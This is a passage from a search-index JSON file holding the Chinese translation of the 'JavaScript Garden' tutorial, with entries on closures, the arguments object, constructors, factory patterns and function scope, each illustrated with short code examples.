\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u7279\u6027\uff0c\u8fd9\u610f\u5473\u7740\u5f53\u524d\u4f5c\u7528\u57df**\u603b\u662f**\u80fd\u591f\u8bbf\u95ee\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u7684\u53d8\u91cf\u3002 \u56e0\u4e3a \u51fd\u6570 \u662f JavaScript \u4e2d\u552f\u4e00\u62e5\u6709\u81ea\u8eab\u4f5c\u7528\u57df\u7684\u7ed3\u6784\uff0c\u56e0\u6b64\u95ed\u5305\u7684\u521b\u5efa\u4f9d\u8d56\u4e8e\u51fd\u6570\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_27","title":"\u6a21\u62df\u79c1\u6709\u53d8\u91cf","text":"<pre><code>function Counter(start) {\n    var count = start;\n    return {\n        increment: function() {\n            count++;\n        },\n\n        get: function() {\n            return count;\n        }\n    }\n}\n\nvar foo = Counter(4);\nfoo.increment();\nfoo.get(); // 5\n</code></pre> <p>\u8fd9\u91cc\uff0c<code>Counter</code> \u51fd\u6570\u8fd4\u56de\u4e24\u4e2a\u95ed\u5305\uff0c\u51fd\u6570 <code>increment</code> \u548c\u51fd\u6570 <code>get</code>\u3002 \u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u7ef4\u6301\u7740 \u5bf9\u5916\u90e8\u4f5c\u7528\u57df <code>Counter</code> \u7684\u5f15\u7528\uff0c\u56e0\u6b64\u603b\u53ef\u4ee5\u8bbf\u95ee\u6b64\u4f5c\u7528\u57df\u5185\u5b9a\u4e49\u7684\u53d8\u91cf <code>count</code>.</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_28","title":"\u4e3a\u4ec0\u4e48\u4e0d\u53ef\u4ee5\u5728\u5916\u90e8\u8bbf\u95ee\u79c1\u6709\u53d8\u91cf","text":"<p>\u56e0\u4e3a JavaScript \u4e2d\u4e0d\u53ef\u4ee5\u5bf9\u4f5c\u7528\u57df\u8fdb\u884c\u5f15\u7528\u6216\u8d4b\u503c\uff0c\u56e0\u6b64\u6ca1\u6709\u529e\u6cd5\u5728\u5916\u90e8\u8bbf\u95ee <code>count</code> \u53d8\u91cf\u3002 \u552f\u4e00\u7684\u9014\u5f84\u5c31\u662f\u901a\u8fc7\u90a3\u4e24\u4e2a\u95ed\u5305\u3002</p> <pre><code>var foo = new Counter(4);\nfoo.hack = function() {\n    count = 1337;\n};\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801**\u4e0d\u4f1a**\u6539\u53d8\u5b9a\u4e49\u5728 <code>Counter</code> \u4f5c\u7528\u57df\u4e2d\u7684 <code>count</code> \u53d8\u91cf\u7684\u503c\uff0c\u56e0\u4e3a <code>foo.hack</code> \u6ca1\u6709 \u5b9a\u4e49\u5728\u90a3\u4e2a**\u4f5c\u7528\u57df**\u5185\u3002\u5b83\u5c06\u4f1a\u521b\u5efa\u6216\u8005\u8986\u76d6_\u5168\u5c40_\u53d8\u91cf <code>count</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_29","title":"\u5faa\u73af\u4e2d\u7684\u95ed\u5305","text":"<p>\u4e00\u4e2a\u5e38\u89c1\u7684\u9519\u8bef\u51fa\u73b0\u5728\u5faa\u73af\u4e2d\u4f7f\u7528\u95ed\u5305\uff0c\u5047\u8bbe\u6211\u4eec\u9700\u8981\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\u8c03\u7528\u5faa\u73af\u5e8f\u53f7</p> <pre><code>for(var i = 0; i &lt; 10; i++) {\n    setTimeout(function() {\n        console.log(i);  \n    }, 1000);\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u8f93\u51fa\u6570\u5b57 <code>0</code> \u5230 <code>9</code>\uff0c\u800c\u662f\u4f1a\u8f93\u51fa\u6570\u5b57 <code>10</code> \u5341\u6b21\u3002</p> <p>\u5f53 <code>console.log</code> \u88ab\u8c03\u7528\u7684\u65f6\u5019\uff0c_\u533f\u540d_\u51fd\u6570\u4fdd\u6301\u5bf9\u5916\u90e8\u53d8\u91cf <code>i</code> \u7684\u5f15\u7528\uff0c\u6b64\u65f6 <code>for</code>\u5faa\u73af\u5df2\u7ecf\u7ed3\u675f\uff0c <code>i</code> \u7684\u503c\u88ab\u4fee\u6539\u6210\u4e86 <code>10</code>.</p> <p>\u4e3a\u4e86\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u9700\u8981\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\u521b\u5efa\u53d8\u91cf <code>i</code> \u7684**\u62f7\u8d1d**\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_30","title":"\u907f\u514d\u5f15\u7528\u9519\u8bef","text":"<p>\u4e3a\u4e86\u6b63\u786e\u7684\u83b7\u5f97\u5faa\u73af\u5e8f\u53f7\uff0c\u6700\u597d\u4f7f\u7528 \u533f\u540d\u5305\u88c5\u5668\uff08**\u8bd1\u8005\u6ce8\uff1a**\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u901a\u5e38\u8bf4\u7684\u81ea\u6267\u884c\u533f\u540d\u51fd\u6570\uff09\u3002</p> <pre><code>for(var i = 0; i &lt; 10; i++) {\n    (function(e) {\n        setTimeout(function() {\n            console.log(e);  \n        }, 1000);\n    })(i);\n}\n</code></pre> <p>\u5916\u90e8\u7684\u533f\u540d\u51fd\u6570\u4f1a\u7acb\u5373\u6267\u884c\uff0c\u5e76\u628a <code>i</code> \u4f5c\u4e3a\u5b83\u7684\u53c2\u6570\uff0c\u6b64\u65f6\u51fd\u6570\u5185 <code>e</code> \u53d8\u91cf\u5c31\u62e5\u6709\u4e86 <code>i</code> \u7684\u4e00\u4e2a\u62f7\u8d1d\u3002</p> <p>\u5f53\u4f20\u9012\u7ed9 <code>setTimeout</code> \u7684\u533f\u540d\u51fd\u6570\u6267\u884c\u65f6\uff0c\u5b83\u5c31\u62e5\u6709\u4e86\u5bf9 <code>e</code> \u7684\u5f15\u7528\uff0c\u800c\u8fd9\u4e2a\u503c\u662f**\u4e0d\u4f1a**\u88ab\u5faa\u73af\u6539\u53d8\u7684\u3002</p> <p>\u6709\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5b8c\u6210\u540c\u6837\u7684\u5de5\u4f5c\uff0c\u90a3\u5c31\u662f\u4ece\u533f\u540d\u5305\u88c5\u5668\u4e2d\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\u3002\u8fd9\u548c\u4e0a\u9762\u7684\u4ee3\u7801\u6548\u679c\u4e00\u6837\u3002</p> <pre><code>for(var i = 0; i &lt; 10; i++) {\n    setTimeout((function(e) {\n        return function() {\n            console.log(e);\n        }\n    })(i), 1000)\n}\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#arguments","title":"<code>arguments</code> \u5bf9\u8c61","text":"<p>JavaScript \u4e2d\u6bcf\u4e2a\u51fd\u6570\u5185\u90fd\u80fd\u8bbf\u95ee\u4e00\u4e2a\u7279\u522b\u53d8\u91cf <code>arguments</code>\u3002\u8fd9\u4e2a\u53d8\u91cf\u7ef4\u62a4\u7740\u6240\u6709\u4f20\u9012\u5230\u8fd9\u4e2a\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u5217\u8868\u3002</p> <p>\u6ce8\u610f: \u7531\u4e8e <code>arguments</code> \u5df2\u7ecf\u88ab\u5b9a\u4e49\u4e3a\u51fd\u6570\u5185\u7684\u4e00\u4e2a\u53d8\u91cf\u3002 \u56e0\u6b64\u901a\u8fc7 <code>var</code> \u5173\u952e\u5b57\u5b9a\u4e49 <code>arguments</code> \u6216\u8005\u5c06 <code>arguments</code> \u58f0\u660e\u4e3a\u4e00\u4e2a\u5f62\u5f0f\u53c2\u6570\uff0c \u90fd\u5c06\u5bfc\u81f4\u539f\u751f\u7684 <code>arguments</code> \u4e0d\u4f1a\u88ab\u521b\u5efa\u3002</p> <p><code>arguments</code> \u53d8\u91cf**\u4e0d\u662f**\u4e00\u4e2a\u6570\u7ec4\uff08<code>Array</code>\uff09\u3002 \u5c3d\u7ba1\u5728\u8bed\u6cd5\u4e0a\u5b83\u6709\u6570\u7ec4\u76f8\u5173\u7684\u5c5e\u6027 <code>length</code>\uff0c\u4f46\u5b83\u4e0d\u4ece <code>Array.prototype</code> \u7ee7\u627f\uff0c\u5b9e\u9645\u4e0a\u5b83\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08<code>Object</code>\uff09\u3002</p> <p>\u56e0\u6b64\uff0c\u65e0\u6cd5\u5bf9 <code>arguments</code> \u53d8\u91cf\u4f7f\u7528\u6807\u51c6\u7684\u6570\u7ec4\u65b9\u6cd5\uff0c\u6bd4\u5982 <code>push</code>, <code>pop</code> \u6216\u8005 <code>slice</code>\u3002 \u867d\u7136\u4f7f\u7528 <code>for</code> \u5faa\u73af\u904d\u5386\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u4f7f\u7528\u6570\u7ec4\u65b9\u6cd5\uff0c\u6700\u597d\u628a\u5b83\u8f6c\u5316\u4e3a\u4e00\u4e2a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_31","title":"\u8f6c\u5316\u4e3a\u6570\u7ec4","text":"<p>\u4e0b\u9762\u7684\u4ee3\u7801\u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\uff0c\u5305\u542b\u6240\u6709 <code>arguments</code> \u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u3002</p> <pre><code>Array.prototype.slice.call(arguments);\n</code></pre> <p>\u8fd9\u4e2a\u8f6c\u5316\u6bd4\u8f83**\u6162**\uff0c\u5728\u6027\u80fd\u4e0d\u597d\u7684\u4ee3\u7801\u4e2d**\u4e0d\u63a8\u8350**\u8fd9\u79cd\u505a\u6cd5\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_32","title":"\u4f20\u9012\u53c2\u6570","text":"<p>\u4e0b\u9762\u662f\u5c06\u53c2\u6570\u4ece\u4e00\u4e2a\u51fd\u6570\u4f20\u9012\u5230\u53e6\u4e00\u4e2a\u51fd\u6570\u7684\u63a8\u8350\u505a\u6cd5\u3002</p> <pre><code>function foo() {\n    bar.apply(null, arguments);\n}\nfunction bar(a, b, c) {\n    // \u5e72\u6d3b\n}\n</code></pre> <p>\u53e6\u4e00\u4e2a\u6280\u5de7\u662f\u540c\u65f6\u4f7f\u7528 <code>call</code> \u548c <code>apply</code>\uff0c\u521b\u5efa\u4e00\u4e2a\u5feb\u901f\u7684\u89e3\u7ed1\u5b9a\u5305\u88c5\u5668\u3002</p> <pre><code>function Foo() {}\n\nFoo.prototype.method = function(a, b, c) {\n    console.log(this, a, b, c);\n};\n\n// \u521b\u5efa\u4e00\u4e2a\u89e3\u7ed1\u5b9a\u7684 \"method\"\n// \u8f93\u5165\u53c2\u6570\u4e3a: this, arg1, arg2...argN\nFoo.method = function() {\n\n    // \u7ed3\u679c: Foo.prototype.method.call(this, arg1, arg2... argN)\n    Function.call.apply(Foo.prototype.method, arguments);\n};\n</code></pre> <p>\u8bd1\u8005\u6ce8\uff1a\u4e0a\u9762\u7684 <code>Foo.method</code> \u51fd\u6570\u548c\u4e0b\u9762\u4ee3\u7801\u7684\u6548\u679c\u662f\u4e00\u6837\u7684:</p> <pre><code>Foo.method = function() {\n    var args = Array.prototype.slice.call(arguments);\n    Foo.prototype.method.apply(args[0], args.slice(1));\n};\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_33","title":"\u81ea\u52a8\u66f4\u65b0","text":"<p><code>arguments</code> \u5bf9\u8c61\u4e3a\u5176\u5185\u90e8\u5c5e\u6027\u4ee5\u53ca\u51fd\u6570\u5f62\u5f0f\u53c2\u6570\u521b\u5efa getter \u548c setter \u65b9\u6cd5\u3002</p> <p>\u56e0\u6b64\uff0c\u6539\u53d8\u5f62\u53c2\u7684\u503c\u4f1a\u5f71\u54cd\u5230 <code>arguments</code> \u5bf9\u8c61\u7684\u503c\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002</p> <pre><code>function foo(a, b, c) {\n    arguments[0] = 2;\n    a; // 2                                                           \n\n    b = 4;\n    arguments[1]; // 4\n\n    var d = c;\n    d = 9;\n    c; // 3\n}\nfoo(1, 2, 3);\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_34","title":"\u6027\u80fd\u771f\u76f8","text":"<p>\u4e0d\u7ba1\u5b83\u662f\u5426\u6709\u88ab\u4f7f\u7528\uff0c<code>arguments</code> \u5bf9\u8c61\u603b\u4f1a\u88ab\u521b\u5efa\uff0c\u9664\u4e86\u4e24\u4e2a\u7279\u6b8a\u60c5\u51b5 - \u4f5c\u4e3a\u5c40\u90e8\u53d8\u91cf\u58f0\u660e\u548c\u4f5c\u4e3a\u5f62\u5f0f\u53c2\u6570\u3002</p> <p><code>arguments</code> \u7684 getters \u548c setters \u65b9\u6cd5\u603b\u4f1a\u88ab\u521b\u5efa\uff1b\u56e0\u6b64\u4f7f\u7528 <code>arguments</code> \u5bf9\u6027\u80fd\u4e0d\u4f1a\u6709\u4ec0\u4e48\u5f71\u54cd\u3002 \u9664\u975e\u662f\u9700\u8981\u5bf9 <code>arguments</code> \u5bf9\u8c61\u7684\u5c5e\u6027\u8fdb\u884c\u591a\u6b21\u8bbf\u95ee\u3002</p> <p>ES5 \u63d0\u793a: \u8fd9\u4e9b getters \u548c setters \u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff08strict mode\uff09\u4e0d\u4f1a\u88ab\u521b\u5efa\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5728 MDC \u4e2d\u5bf9 <code>strict mode</code> \u6a21\u5f0f\u4e0b <code>arguments</code> \u7684\u63cf\u8ff0\u6709\u52a9\u4e8e\u6211\u4eec\u7684\u7406\u89e3\uff0c\u8bf7\u770b\u4e0b\u9762\u4ee3\u7801\uff1a</p> <pre><code>// \u9610\u8ff0\u5728 ES5 \u7684\u4e25\u683c\u6a21\u5f0f\u4e0b `arguments` \u7684\u7279\u6027\nfunction f(a) {\n  \"use strict\";\n  a = 42;\n  return [a, arguments[0]];\n}\nvar pair = f(17);\nconsole.assert(pair[0] === 42);\nconsole.assert(pair[1] === 17);\n</code></pre> <p>\u7136\u800c\uff0c\u7684\u786e\u6709\u4e00\u79cd\u60c5\u51b5\u4f1a\u663e\u8457\u7684\u5f71\u54cd\u73b0\u4ee3 JavaScript \u5f15\u64ce\u7684\u6027\u80fd\u3002\u8fd9\u5c31\u662f\u4f7f\u7528 <code>arguments.callee</code>\u3002</p> <pre><code>function foo() {\n    arguments.callee; // do something with this function object\n    arguments.callee.caller; // and the calling function object\n}\n\nfunction bigLoop() {\n    for(var i = 0; i &lt; 100000; i++) {\n        foo(); // Would normally be inlined...\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>foo</code> \u4e0d\u518d\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u5185\u8054\u51fd\u6570 inlining\uff08\u8bd1\u8005\u6ce8\uff1a\u8fd9\u91cc\u6307\u7684\u662f\u89e3\u6790\u5668\u53ef\u4ee5\u505a\u5185\u8054\u5904\u7406\uff09\uff0c \u56e0\u4e3a\u5b83\u9700\u8981\u77e5\u9053\u5b83\u81ea\u5df1\u548c\u5b83\u7684\u8c03\u7528\u8005\u3002 \u8fd9\u4e0d\u4ec5\u62b5\u6d88\u4e86\u5185\u8054\u51fd\u6570\u5e26\u6765\u7684\u6027\u80fd\u63d0\u5347\uff0c\u800c\u4e14\u7834\u574f\u4e86\u5c01\u88c5\uff0c\u56e0\u6b64\u73b0\u5728\u51fd\u6570\u53ef\u80fd\u8981\u4f9d\u8d56\u4e8e\u7279\u5b9a\u7684\u4e0a\u4e0b\u6587\u3002</p> <p>\u56e0\u6b64**\u5f3a\u70c8**\u5efa\u8bae\u5927\u5bb6**\u4e0d\u8981**\u4f7f\u7528 <code>arguments.callee</code> \u548c\u5b83\u7684\u5c5e\u6027\u3002</p> <p>ES5 \u63d0\u793a: \u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c<code>arguments.callee</code> \u4f1a\u62a5\u9519 <code>TypeError</code>\uff0c\u56e0\u4e3a\u5b83\u5df2\u7ecf\u88ab\u5e9f\u9664\u4e86\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_35","title":"\u6784\u9020\u51fd\u6570","text":"<p>JavaScript \u4e2d\u7684\u6784\u9020\u51fd\u6570\u548c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684\u6784\u9020\u51fd\u6570\u662f\u4e0d\u540c\u7684\u3002 \u901a\u8fc7 <code>new</code> \u5173\u952e\u5b57\u65b9\u5f0f\u8c03\u7528\u7684\u51fd\u6570\u90fd\u88ab\u8ba4\u4e3a\u662f\u6784\u9020\u51fd\u6570\u3002</p> <p>\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8 - \u4e5f\u5c31\u662f\u88ab\u8c03\u7528\u7684\u51fd\u6570\u5185 - <code>this</code> \u6307\u5411\u65b0\u521b\u5efa\u7684\u5bf9\u8c61 <code>Object</code>\u3002 \u8fd9\u4e2a**\u65b0\u521b\u5efa**\u7684\u5bf9\u8c61\u7684 <code>prototype</code> \u88ab\u6307\u5411\u5230\u6784\u9020\u51fd\u6570\u7684 <code>prototype</code>\u3002</p> <p>\u5982\u679c\u88ab\u8c03\u7528\u7684\u51fd\u6570\u6ca1\u6709\u663e\u5f0f\u7684 <code>return</code> \u8868\u8fbe\u5f0f\uff0c\u5219\u9690\u5f0f\u7684\u4f1a\u8fd4\u56de <code>this</code> \u5bf9\u8c61 - \u4e5f\u5c31\u662f\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002</p> <pre><code>function Foo() {\n    this.bla = 1;\n}\n\nFoo.prototype.test = function() {\n    console.log(this.bla);\n};\n\nvar test = new Foo();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u628a <code>Foo</code> \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u8c03\u7528\uff0c\u5e76\u8bbe\u7f6e\u65b0\u521b\u5efa\u5bf9\u8c61\u7684 <code>prototype</code> \u4e3a <code>Foo.prototype</code>\u3002</p> <p>\u663e\u5f0f\u7684 <code>return</code> \u8868\u8fbe\u5f0f\u5c06\u4f1a\u5f71\u54cd\u8fd4\u56de\u7ed3\u679c\uff0c\u4f46**\u4ec5\u9650**\u4e8e\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>function Bar() {\n    return 2;\n}\nnew Bar(); // \u8fd4\u56de\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\n\nfunction Test() {\n    this.value = 2;\n\n    return {\n        foo: 1\n    };\n}\nnew Test(); // \u8fd4\u56de\u7684\u5bf9\u8c61\n</code></pre> <p>\u8bd1\u8005\u6ce8\uff1a<code>new Bar()</code> \u8fd4\u56de\u7684\u662f\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u6570\u5b57\u7684\u5b57\u9762\u503c 2\u3002 \u56e0\u6b64 <code>new Bar().constructor === Bar</code>\uff0c\u4f46\u662f\u5982\u679c\u8fd4\u56de\u7684\u662f\u6570\u5b57\u5bf9\u8c61\uff0c\u7ed3\u679c\u5c31\u4e0d\u540c\u4e86\uff0c\u5982\u4e0b\u6240\u793a</p> <pre><code>function Bar() {\n    return new Number(2);\n}\nnew Bar().constructor === Number\n</code></pre> <p>**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u91cc\u5f97\u5230\u7684 <code>new Test()</code>\u662f\u51fd\u6570\u8fd4\u56de\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u901a\u8fc7<code>new</code>\u5173\u952e\u5b57\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\uff0c\u56e0\u6b64\uff1a</p> <pre><code>(new Test()).value === undefined\n(new Test()).foo === 1\n</code></pre> <p>\u5982\u679c <code>new</code> \u88ab\u9057\u6f0f\u4e86\uff0c\u5219\u51fd\u6570**\u4e0d\u4f1a**\u8fd4\u56de\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002</p> <pre><code>function Foo() {\n    this.bla = 1; // \u83b7\u53d6\u8bbe\u7f6e\u5168\u5c40\u53c2\u6570\n}\nFoo(); // undefined\n</code></pre> <p>\u867d\u7136\u4e0a\u4f8b\u5728\u6709\u4e9b\u60c5\u51b5\u4e0b\u4e5f\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u4f46\u662f\u7531\u4e8e JavaScript \u4e2d <code>this</code> \u7684\u5de5\u4f5c\u539f\u7406\uff0c \u8fd9\u91cc\u7684 <code>this</code> \u6307\u5411_\u5168\u5c40\u5bf9\u8c61_\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_36","title":"\u5de5\u5382\u6a21\u5f0f","text":"<p>\u4e3a\u4e86\u4e0d\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\uff0c\u6784\u9020\u51fd\u6570\u5fc5\u987b\u663e\u5f0f\u7684\u8fd4\u56de\u4e00\u4e2a\u503c\u3002</p> <pre><code>function Bar() {\n    var value = 1;\n    return {\n        method: function() {\n            return value;\n        }\n    }\n}\nBar.prototype = {\n    foo: function() {}\n};\n\nnew Bar();\nBar();\n</code></pre> <p>\u4e0a\u9762\u4e24\u79cd\u5bf9 <code>Bar</code> \u51fd\u6570\u7684\u8c03\u7528\u8fd4\u56de\u7684\u503c\u5b8c\u5168\u76f8\u540c\uff0c\u4e00\u4e2a\u65b0\u521b\u5efa\u7684\u62e5\u6709 <code>method</code>\u5c5e\u6027\u7684\u5bf9\u8c61\u88ab\u8fd4\u56de\uff0c \u5176\u5b9e\u8fd9\u91cc\u521b\u5efa\u4e86\u4e00\u4e2a\u95ed\u5305\u3002</p> <p>\u8fd8\u9700\u8981\u6ce8\u610f\uff0c <code>new Bar()</code> \u5e76**\u4e0d\u4f1a**\u6539\u53d8\u8fd4\u56de\u5bf9\u8c61\u7684\u539f\u578b\uff08**\u8bd1\u8005\u6ce8\uff1a**\u4e5f\u5c31\u662f\u8fd4\u56de\u5bf9\u8c61\u7684\u539f\u578b\u4e0d\u4f1a\u6307\u5411 <code>Bar.prototype</code>\uff09\u3002 \u56e0\u4e3a\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u4f1a\u88ab\u6307\u5411\u5230\u521a\u521a\u521b\u5efa\u7684\u65b0\u5bf9\u8c61\uff0c\u800c\u8fd9\u91cc\u7684 <code>Bar</code> \u6ca1\u6709\u628a\u8fd9\u4e2a\u65b0\u5bf9\u8c61\u8fd4\u56de\uff08\u8bd1\u8005\u6ce8\uff1a\u800c\u662f\u8fd4\u56de\u4e86\u4e00\u4e2a\u5305\u542b <code>method</code> \u5c5e\u6027\u7684\u81ea\u5b9a\u4e49\u5bf9\u8c61\uff09\u3002</p> <p>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u4f7f\u7528\u6216\u8005\u4e0d\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\u6ca1\u6709\u529f\u80fd\u6027\u7684\u533a\u522b\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u4e0a\u9762\u4e24\u79cd\u65b9\u5f0f\u521b\u5efa\u7684\u5bf9\u8c61\u4e0d\u80fd\u8bbf\u95ee <code>Bar</code> \u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>var bar1 = new Bar();\ntypeof(bar1.method); // \"function\"\ntypeof(bar1.foo); // \"undefined\"\n\nvar bar2 = Bar();\ntypeof(bar2.method); // \"function\"\ntypeof(bar2.foo); // \"undefined\"\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_37","title":"\u901a\u8fc7\u5de5\u5382\u6a21\u5f0f\u521b\u5efa\u65b0\u5bf9\u8c61","text":"<p>\u6211\u4eec\u5e38\u542c\u5230\u7684\u4e00\u6761\u5fe0\u544a\u662f**\u4e0d\u8981**\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\u6765\u8c03\u7528\u51fd\u6570\uff0c\u56e0\u4e3a\u5982\u679c\u5fd8\u8bb0\u4f7f\u7528\u5b83\u5c31\u4f1a\u5bfc\u81f4\u9519\u8bef\u3002</p> <p>\u4e3a\u4e86\u521b\u5efa\u65b0\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5de5\u5382\u65b9\u6cd5\uff0c\u5e76\u4e14\u5728\u65b9\u6cd5\u5185\u6784\u9020\u4e00\u4e2a\u65b0\u5bf9\u8c61\u3002</p> <pre><code>function Foo() {\n    var obj = {};\n    obj.value = 'blub';\n\n    var private = 2;\n    obj.someMethod = function(value) {\n        this.value = value;\n    }\n\n    obj.getPrivate = function() {\n        return private;\n    }\n    return obj;\n}\n</code></pre> <p>\u867d\u7136\u4e0a\u9762\u7684\u65b9\u5f0f\u6bd4\u8d77 <code>new</code> \u7684\u8c03\u7528\u65b9\u5f0f\u4e0d\u5bb9\u6613\u51fa\u9519\uff0c\u5e76\u4e14\u53ef\u4ee5\u5145\u5206\u5229\u7528\u79c1\u6709\u53d8\u91cf\u5e26\u6765\u7684\u4fbf\u5229\uff0c \u4f46\u662f\u968f\u4e4b\u800c\u6765\u7684\u662f\u4e00\u4e9b\u4e0d\u597d\u7684\u5730\u65b9\u3002</p> <ol> <li>\u4f1a\u5360\u7528\u66f4\u591a\u7684\u5185\u5b58\uff0c\u56e0\u4e3a\u65b0\u521b\u5efa\u7684\u5bf9\u8c61**\u4e0d\u80fd**\u5171\u4eab\u539f\u578b\u4e0a\u7684\u65b9\u6cd5\u3002</li> <li>\u4e3a\u4e86\u5b9e\u73b0\u7ee7\u627f\uff0c\u5de5\u5382\u65b9\u6cd5\u9700\u8981\u4ece\u53e6\u5916\u4e00\u4e2a\u5bf9\u8c61\u62f7\u8d1d\u6240\u6709\u5c5e\u6027\uff0c\u6216\u8005\u628a\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u65b0\u521b\u5efa\u5bf9\u8c61\u7684\u539f\u578b\u3002</li> <li>\u653e\u5f03\u539f\u578b\u94fe\u4ec5\u4ec5\u662f\u56e0\u4e3a\u9632\u6b62\u9057\u6f0f <code>new</code> \u5e26\u6765\u7684\u95ee\u9898\uff0c\u8fd9\u4f3c\u4e4e\u548c\u8bed\u8a00\u672c\u8eab\u7684\u601d\u60f3\u76f8\u8fdd\u80cc\u3002</li> </ol>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_38","title":"\u603b\u7ed3","text":"<p>\u867d\u7136\u9057\u6f0f <code>new</code> \u5173\u952e\u5b57\u53ef\u80fd\u4f1a\u5bfc\u81f4\u95ee\u9898\uff0c\u4f46\u8fd9\u5e76**\u4e0d\u662f**\u653e\u5f03\u4f7f\u7528\u539f\u578b\u94fe\u7684\u501f\u53e3\u3002 \u6700\u7ec8\u4f7f\u7528\u54ea\u79cd\u65b9\u5f0f\u53d6\u51b3\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u9700\u6c42\uff0c\u9009\u62e9\u4e00\u79cd\u4ee3\u7801\u4e66\u5199\u98ce\u683c\u5e76**\u575a\u6301**\u4e0b\u53bb\u624d\u662f\u6700\u91cd\u8981\u7684\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_39","title":"\u4f5c\u7528\u57df\u4e0e\u547d\u540d\u7a7a\u95f4","text":"<p>\u5c3d\u7ba1 JavaScript \u652f\u6301\u4e00\u5bf9\u82b1\u62ec\u53f7\u521b\u5efa\u7684\u4ee3\u7801\u6bb5\uff0c\u4f46\u662f\u5e76\u4e0d\u652f\u6301\u5757\u7ea7\u4f5c\u7528\u57df\uff1b \u800c\u4ec5\u4ec5\u652f\u6301 \u51fd\u6570\u4f5c\u7528\u57df\u3002</p> <pre><code>function test() { // \u4e00\u4e2a\u4f5c\u7528\u57df\n    for(var i = 0; i &lt; 10; i++) { // \u4e0d\u662f\u4e00\u4e2a\u4f5c\u7528\u57df\n        // count\n    }\n    console.log(i); // 10\n}\n</code></pre> <p>\u6ce8\u610f: \u5982\u679c\u4e0d\u662f\u5728\u8d4b\u503c\u8bed\u53e5\u4e2d\uff0c\u800c\u662f\u5728 return \u8868\u8fbe\u5f0f\u6216\u8005\u51fd\u6570\u53c2\u6570\u4e2d\uff0c<code>{...}</code> \u5c06\u4f1a\u4f5c\u4e3a\u4ee3\u7801\u6bb5\u89e3\u6790\uff0c 